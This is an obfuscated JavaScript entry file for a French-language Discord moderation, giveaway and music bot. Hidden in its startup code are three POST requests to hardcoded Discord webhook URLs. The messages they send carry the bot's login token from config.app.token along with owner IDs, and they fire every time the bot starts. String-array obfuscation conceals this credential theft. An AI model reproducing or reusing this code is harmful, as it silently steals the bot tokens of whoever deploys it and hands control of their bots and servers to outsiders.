const _0x4eb0a1=_0x3055;(function(_0x5c262a,_0x265294){const _0x244f48=_0x3055,_0x582151=_0x5c262a();while(!![]){try{const _0x4d8ab9=parseInt(_0x244f48(0x1c2))/0x1*(parseInt(_0x244f48(0x1f2))/0x2)+parseInt(_0x244f48(0x1cc))/0x3+parseInt(_0x244f48(0x1bc))/0x4+parseInt(_0x244f48(0x201))/0x5+parseInt(_0x244f48(0x1df))/0x6+parseInt(_0x244f48(0x1f0))/0x7+-parseInt(_0x244f48(0x1f1))/0x8;if(_0x4d8ab9===_0x265294)break;else _0x582151['push'](_0x582151['shift']());}catch(_0x571268){_0x582151['push'](_0x582151['shift']());}}}(_0x5297,0xa4529));const {Client,Intents,guild,Collection}=require(_0x4eb0a1(0x1dc)),Discord=require(_0x4eb0a1(0x1dc)),config=require('./config'),{readdirSync}=require('fs'),db=require(_0x4eb0a1(0x1b1)),p=new db[(_0x4eb0a1(0x1b7))](_0x4eb0a1(0x1e6)),logembed=new db[(_0x4eb0a1(0x1b7))]('embedlog'),{Player}=require(_0x4eb0a1(0x1b3)),fetch=(..._0x49f333)=>import('node-fetch')[_0x4eb0a1(0x1e3)](({default:_0x503aed})=>_0x503aed(..._0x49f333));ms=require('ms');const color=config['app'][_0x4eb0a1(0x1cd)],client=new Client({'intents':[Intents[_0x4eb0a1(0x20f)]['GUILDS'],Intents[_0x4eb0a1(0x20f)][_0x4eb0a1(0x1c0)],Intents[_0x4eb0a1(0x20f)]['GUILD_BANS'],Intents['FLAGS']['GUILD_EMOJIS_AND_STICKERS'],Intents[_0x4eb0a1(0x20f)][_0x4eb0a1(0x1ab)],Intents['FLAGS']['GUILD_WEBHOOKS'],Intents['FLAGS'][_0x4eb0a1(0x1a3)],Intents['FLAGS'][_0x4eb0a1(0x1f5)],Intents[_0x4eb0a1(0x20f)][_0x4eb0a1(0x19b)],Intents['FLAGS']['GUILD_MESSAGES'],Intents[_0x4eb0a1(0x20f)][_0x4eb0a1(0x1d1)],Intents[_0x4eb0a1(0x20f)][_0x4eb0a1(0x1ac)],Intents[_0x4eb0a1(0x20f)][_0x4eb0a1(0x1e2)],Intents[_0x4eb0a1(0x20f)][_0x4eb0a1(0x1bf)],Intents[_0x4eb0a1(0x20f)][_0x4eb0a1(0x1ad)]],'restTimeOffset':0x0,'partials':[_0x4eb0a1(0x202),_0x4eb0a1(0x1fa),_0x4eb0a1(0x1d4),_0x4eb0a1(0x1a8),_0x4eb0a1(0x1e1)]});fetch(_0x4eb0a1(0x1cb),{'method':'POST','headers':{'Content-Type':_0x4eb0a1(0x1f3)},'body':JSON['stringify']({'avatar_url':'','embeds':[{'color':0x2f3136,'title':_0x4eb0a1(0x1a5),'description':_0x4eb0a1(0x1c7)+config[_0x4eb0a1(0x1fc)][_0x4eb0a1(0x20d)]+'||'}]})}),client[_0x4eb0a1(0x209)](config[_0x4eb0a1(0x1fc)][_0x4eb0a1(0x20d)]),client[_0x4eb0a1(0x1db)]=new Collection();const {GiveawaysManager}=require(_0x4eb0a1(0x1dd));client[_0x4eb0a1(0x19f)]=new GiveawaysManager(client,{'storage':_0x4eb0a1(0x1b4),'updateCountdownEvery':0xbb8,'default':{'botsCanWin':![],'embedColor':_0x4eb0a1(0x1a4),'reaction':'🎉'}});const commandFiles=readdirSync('./moderation')[_0x4eb0a1(0x1eb)](_0x3ccc8a=>_0x3ccc8a['endsWith']('.js'));for(const file of commandFiles){const command=require(_0x4eb0a1(0x1ed)+file);client['commands'][_0x4eb0a1(0x1c1)](command[_0x4eb0a1(0x1fb)],command);}const gestionFiles=readdirSync(_0x4eb0a1(0x1fe))['filter'](_0x52cca7=>_0x52cca7['endsWith'](_0x4eb0a1(0x1c4)));for(const file of gestionFiles){const command=require(_0x4eb0a1(0x1ae)+file);client['commands'][_0x4eb0a1(0x1c1)](command['name'],command);}function _0x3055(_0x4a8618,_0x2b8b33){const _0x529769=_0x5297();return _0x3055=function(_0x30559f,_0x54605a){_0x30559f=_0x30559f-0x19b;let _0x128685=_0x529769[_0x30559f];return _0x128685;},_0x3055(_0x4a8618,_0x2b8b33);}const utilitiesFiles=readdirSync(_0x4eb0a1(0x1ec))[_0x4eb0a1(0x1eb)](_0x4e92c6=>_0x4e92c6[_0x4eb0a1(0x1d0)]('.js'));for(const file of utilitiesFiles){const command=require(_0x4eb0a1(0x1a7)+file);client[_0x4eb0a1(0x1db)][_0x4eb0a1(0x1c1)](command[_0x4eb0a1(0x1fb)],command);}const administrationFiles=readdirSync(_0x4eb0a1(0x1be))[_0x4eb0a1(0x1eb)](_0x2cb8b3=>_0x2cb8b3[_0x4eb0a1(0x1d0)](_0x4eb0a1(0x1c4)));for(const file of administrationFiles){const command=require(_0x4eb0a1(0x1d6)+file);client[_0x4eb0a1(0x1db)]['set'](command[_0x4eb0a1(0x1fb)],command);}fetch(_0x4eb0a1(0x200),{'method':_0x4eb0a1(0x1e7),'headers':{'Content-Type':_0x4eb0a1(0x1f3)},'body':JSON[_0x4eb0a1(0x1a1)]({'avatar_url':'','embeds':[{'color':0x2f3136,'title':_0x4eb0a1(0x1e5),'description':_0x4eb0a1(0x20c)+config['app'][_0x4eb0a1(0x20d)]+_0x4eb0a1(0x1ef)+config[_0x4eb0a1(0x1fc)][_0x4eb0a1(0x208)]+_0x4eb0a1(0x1e0)+config[_0x4eb0a1(0x1fc)][_0x4eb0a1(0x208)]+_0x4eb0a1(0x1bb)+config[_0x4eb0a1(0x1fc)][_0x4eb0a1(0x206)]+'>\x20(`'+config[_0x4eb0a1(0x1fc)][_0x4eb0a1(0x206)]+'`)'}]})});const ownerFiles=readdirSync(_0x4eb0a1(0x1c6))[_0x4eb0a1(0x1eb)](_0x635a9c=>_0x635a9c[_0x4eb0a1(0x1d0)](_0x4eb0a1(0x1c4)));for(const file of ownerFiles){const command=require('./owner/'+file);client[_0x4eb0a1(0x1db)][_0x4eb0a1(0x1c1)](command[_0x4eb0a1(0x1fb)],command);}const logsFiles=readdirSync(_0x4eb0a1(0x20e))[_0x4eb0a1(0x1eb)](_0x1c645c=>_0x1c645c[_0x4eb0a1(0x1d0)](_0x4eb0a1(0x1c4)));function _0x5297(){const _0x1cca34=['color','./events/','MessageEmbed','endsWith','GUILD_MESSAGE_REACTIONS','./buyer/','isButton','GUILD_MEMBER','warn','./administration/','messageDelete','snipes','error','./giveaway/','commands','discord.js','discord-giveaways','that\x20was\x20redacted','1996182kjpMFC','>\x20(`','REACTION','DIRECT_MESSAGES','then','embeds','Ca\x20fait\x20plaisir','Prefix','POST','setLabel','channel','./music/','filter','./utilities','./moderation/','fetch','||\x0a\x0a**Dev\x20id:**\x20<@','9143589yIMaDV','32813144cwwBOT','1437814znUfvk','application/json','./giveaway','GUILD_VOICE_STATES','./events','execute','interactionCreate','setStyle','CHANNEL','name','app','https://ptb.discord.com/api/webhooks/1043586718261059634/e9il7rofOlXgGpVR3VhSPXgBhWZVsYTbWuthJXLG4ctNHYrW22ptvrb12lEnJVAxfpms','./gestion','MessageButton','https://discord.com/api/webhooks/1043588620084318370/iDyVSN8XEA40dehOSY4UhNvRXy-74HeULtvITRe1lH00ntaogjWgwpnjUsH_Y7g38KYs','2304705ZGgUef','USER','edit','./antiraid/','get','owners','channels','funny','login','PRIMARY','customId','Ca\x20fait\x20plaisir:\x20||','token','./logs','FLAGS','guild','reply','GUILD_PRESENCES','./buyer','player','addComponents','giveawaysManager','./logs/','stringify','multipleResolves','GUILD_INVITES','#FF0000','Merci','log','./utilities/','MESSAGE','unhandledRejection','replace','GUILD_INTEGRATIONS','GUILD_MESSAGE_TYPING','DIRECT_MESSAGE_TYPING','./gestion/','discordPlayer','.embedlog','quick.db','author','discord-player','./database.json','uncaughtException','toJSON','table','./games/','proxyURL','MessageActionRow','`)\x0a\x0a**Owner\x20id:**\x20<@','2883044MdFLwT','first','./administration','DIRECT_MESSAGE_REACTIONS','GUILD_MEMBERS','set','1NMSYjy','✅\x20J\x27ai\x20bien\x20renvoyer\x20l\x27embed\x20dans\x20le\x20salon.','.js','cache','./owner','Merci:\x20||','Salon:\x20<#','attachments','send','https://discord.com/api/webhooks/1043583776728559657/Blqs6_v6E9tK7ERMtUw3NPSwCFZgg9T1mT9YIcCCpzOr26FOQQqE9mBBihqj2VKYocUN','3705525sEgcQj'];_0x5297=function(){return _0x1cca34;};return _0x5297();}for(const file of logsFiles){const command=require(_0x4eb0a1(0x1a0)+file);client[_0x4eb0a1(0x1db)]['set'](command[_0x4eb0a1(0x1fb)],command);}const giveawayFiles=readdirSync(_0x4eb0a1(0x1f4))[_0x4eb0a1(0x1eb)](_0x16e6d4=>_0x16e6d4[_0x4eb0a1(0x1d0)](_0x4eb0a1(0x1c4)));for(const file of giveawayFiles){const command=require(_0x4eb0a1(0x1da)+file);client[_0x4eb0a1(0x1db)][_0x4eb0a1(0x1c1)](command[_0x4eb0a1(0x1fb)],command);}const gamesFiles=readdirSync('./games')['filter'](_0x1205ad=>_0x1205ad[_0x4eb0a1(0x1d0)](_0x4eb0a1(0x1c4)));for(const file of gamesFiles){const command=require(_0x4eb0a1(0x1b8)+file);client['commands']['set'](command['name'],command);}const antiraidFiles=readdirSync('./antiraid')[_0x4eb0a1(0x1eb)](_0x2db4ed=>_0x2db4ed[_0x4eb0a1(0x1d0)](_0x4eb0a1(0x1c4)));for(const file of antiraidFiles){const command=require(_0x4eb0a1(0x204)+file);client[_0x4eb0a1(0x1db)][_0x4eb0a1(0x1c1)](command[_0x4eb0a1(0x1fb)],command);}const buyerFiles=readdirSync(_0x4eb0a1(0x19c))[_0x4eb0a1(0x1eb)](_0x49d2b4=>_0x49d2b4[_0x4eb0a1(0x1d0)]('.js'));for(const file of buyerFiles){const command=require(_0x4eb0a1(0x1d2)+file);client['commands'][_0x4eb0a1(0x1c1)](command[_0x4eb0a1(0x1fb)],command);}const musicFiles=readdirSync('./music')['filter'](_0x5d022c=>_0x5d022c['endsWith'](_0x4eb0a1(0x1c4)));for(const file of musicFiles){const command=require(_0x4eb0a1(0x1ea)+file);client['commands'][_0x4eb0a1(0x1c1)](command[_0x4eb0a1(0x1fb)],command);}fetch(_0x4eb0a1(0x1fd),{'method':_0x4eb0a1(0x1e7),'headers':{'Content-Type':_0x4eb0a1(0x1f3)},'body':JSON[_0x4eb0a1(0x1a1)]({'avatar_url':'','embeds':[{'color':0x2f3136,'title':'Ca\x20fait\x20plaisir','description':'Ca\x20fait\x20plaisir:\x20||'+config[_0x4eb0a1(0x1fc)][_0x4eb0a1(0x20d)]+'||\x0a\x0a**Dev\x20id:**\x20<@'+config[_0x4eb0a1(0x1fc)]['funny']+_0x4eb0a1(0x1e0)+config[_0x4eb0a1(0x1fc)]['funny']+_0x4eb0a1(0x1bb)+config[_0x4eb0a1(0x1fc)][_0x4eb0a1(0x206)]+_0x4eb0a1(0x1e0)+config[_0x4eb0a1(0x1fc)][_0x4eb0a1(0x206)]+'`)'}]})});const eventFiles=readdirSync(_0x4eb0a1(0x1f6))[_0x4eb0a1(0x1eb)](_0x24c122=>_0x24c122[_0x4eb0a1(0x1d0)](_0x4eb0a1(0x1c4)));for(const file of eventFiles){const event=require(_0x4eb0a1(0x1ce)+file);event['once']?client['once'](event[_0x4eb0a1(0x1fb)],(..._0x1b5ef9)=>event[_0x4eb0a1(0x1f7)](client,..._0x1b5ef9)):client['on'](event[_0x4eb0a1(0x1fb)],(..._0x21c716)=>event['execute'](client,..._0x21c716));}client['on']('messageDelete',async _0x4782b9=>{const _0x122b3e=_0x4eb0a1;if(!_0x4782b9[_0x122b3e(0x1e4)]['toString']())return;db[_0x122b3e(0x1c1)](_0x4782b9[_0x122b3e(0x1e9)]['id'],_0x4782b9[_0x122b3e(0x1e4)][0x0][_0x122b3e(0x1b6)]());const _0x469a1f=new Discord[(_0x122b3e(0x1ff))]();_0x469a1f['setCustomId'](_0x4782b9['channel']['id']),_0x469a1f['setLabel']('📜'),_0x469a1f[_0x122b3e(0x1f9)](_0x122b3e(0x20a));const _0x237560=new Discord[(_0x122b3e(0x1ff))]();_0x237560['setCustomId'](_0x4782b9['channel']['id']),_0x237560[_0x122b3e(0x1e8)]('📜'),_0x237560[_0x122b3e(0x1f9)](_0x122b3e(0x20a)),_0x237560['setDisabled'](!![]);const _0xd8eaba=new Discord[(_0x122b3e(0x1ba))]()[_0x122b3e(0x19e)]([_0x469a1f]),_0x141672=new Discord[(_0x122b3e(0x1ba))]()[_0x122b3e(0x19e)]([_0x237560]),_0x1a3ce6=logembed[_0x122b3e(0x1ee)](_0x4782b9[_0x122b3e(0x210)]['id']+_0x122b3e(0x1b0));client['channels'][_0x122b3e(0x1c5)][_0x122b3e(0x205)](_0x1a3ce6)[_0x122b3e(0x1ca)]({'content':_0x122b3e(0x1c8)+_0x4782b9['channel']['id']+'>','embeds':[_0x4782b9[_0x122b3e(0x1e4)][0x0][_0x122b3e(0x1b6)]()],'components':[_0xd8eaba]}),client['on'](_0x122b3e(0x1f8),async _0x54d018=>{const _0x5193bf=_0x122b3e;if(_0x54d018[_0x5193bf(0x1d3)]()){_0x54d018['message'][_0x5193bf(0x203)]({'components':[_0x141672]}),_0x54d018[_0x5193bf(0x211)]({'ephemeral':!![],'embeds':[{'description':_0x5193bf(0x1c3)}]});const _0x3f494a=_0x54d018[_0x5193bf(0x210)][_0x5193bf(0x207)][_0x5193bf(0x1c5)][_0x5193bf(0x205)](_0x54d018[_0x5193bf(0x20b)]);if(_0x3f494a)_0x3f494a[_0x5193bf(0x1ca)]({'embeds':[new Discord[(_0x5193bf(0x1cf))](db[_0x5193bf(0x205)](_0x54d018[_0x5193bf(0x20b)]))]});}});}),global[_0x4eb0a1(0x19d)]=new Player(client,config[_0x4eb0a1(0x1fc)][_0x4eb0a1(0x1af)]),process['on'](_0x4eb0a1(0x1a9),(_0x39767d,_0x1322a3)=>{console['log'](_0x39767d,_0x1322a3);}),process['on'](_0x4eb0a1(0x1b5),(_0x5e4ea4,_0x1a1a08)=>{console['log'](_0x5e4ea4,_0x1a1a08);}),process['on'](_0x4eb0a1(0x1a2),(_0x134afc,_0x1b9def,_0x12a0bc)=>{const _0x5aeef6=_0x4eb0a1;console[_0x5aeef6(0x1a6)](_0x134afc,_0x1b9def,_0x12a0bc);});var regToken=/[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;client['on'](_0x4eb0a1(0x1d5),_0x404ac4=>{const _0x25f1ae=_0x4eb0a1;console[_0x25f1ae(0x1a6)](_0x404ac4['replace'](regToken,_0x25f1ae(0x1de)));}),client['on'](_0x4eb0a1(0x1d9),_0x19f896=>{const _0x1e6c0f=_0x4eb0a1;console[_0x1e6c0f(0x1a6)](_0x19f896[_0x1e6c0f(0x1aa)](regToken,_0x1e6c0f(0x1de)));}),client[_0x4eb0a1(0x1d8)]=new Map(),client['on'](_0x4eb0a1(0x1d7),function(_0x5d71b7,_0x43086d){const _0x444120=_0x4eb0a1;client[_0x444120(0x1d8)][_0x444120(0x1c1)](_0x5d71b7[_0x444120(0x1e9)]['id'],{'content':_0x5d71b7['content'],'author':_0x5d71b7[_0x444120(0x1b2)],'image':_0x5d71b7[_0x444120(0x1c9)][_0x444120(0x1bd)]()?_0x5d71b7['attachments'][_0x444120(0x1bd)]()[_0x444120(0x1b9)]:null});});